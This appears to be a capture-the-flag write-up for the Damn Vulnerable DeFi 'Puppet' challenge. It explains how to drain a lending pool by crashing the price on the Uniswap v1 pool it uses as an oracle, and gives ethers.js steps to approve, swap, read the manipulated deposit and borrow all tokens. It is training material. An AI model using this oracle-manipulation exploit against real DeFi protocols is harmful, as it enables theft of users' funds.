### [Contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/puppet)

### Task

>There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

>There’s a DVT market opened in an old [Uniswap v1 exchange](https://docs.uniswap.org/contracts/v1/overview), currently with 10 ETH and 10 DVT in liquidity.

>Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.

### Observations
- This pool calculates the price of DVT from one price oracle Uniswap pool.
- `calculateDepositRequired()` will tell us how much DVT we can borrow with out 25Eth budget.
- Uniswap has a 1-to-1 ratio DVT-to-Eth, and a `DEPOSIT_FACTOR` of 2. "Borrow 1 Deposit 2". 25 Eth gets 12.5 DVT.
- Required deposit is calculated based on the ratio of the Uniswap Market. I have enough Eth to manipulate the price.
- Make the price of DVT really low by depositing DVT to the pool and taking most of the Eth out... i.e. 1 eth to 
- Borrow all the tokens for much less Eth.

### Steps

- Set up for the Uniswap transaction:
```
//appove exchange to spend my tokens
await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);

// block.timestamp + 5 mins
const deadline = (await ethers.provider.getBlock("latest")).timestamp + 300;
console.log(deadline);
```

-  Swap all my DVT with Eth in the Uniswap Pool to devalue DVT.

```
//Swap all DVT for Eth in pool, devaluing DVT. 
await uniswapExchange.connect(player).tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE - 1n, 1, deadline);
```

- Get manipulated required deposit value.
```
//get new manipulated eth depositRequired from pool
const depositRequired = await lendingPool.connect(player).calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
```

- borrow all DVT from lending pool for a small amount of eth (≈ 19.67 Eth).

```
 //borrow all DVT from lending pool.
await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, { value: depositRequired });
```

- This can all be done in one transaction from a smart contract, and is advised, incase this process is frontrun.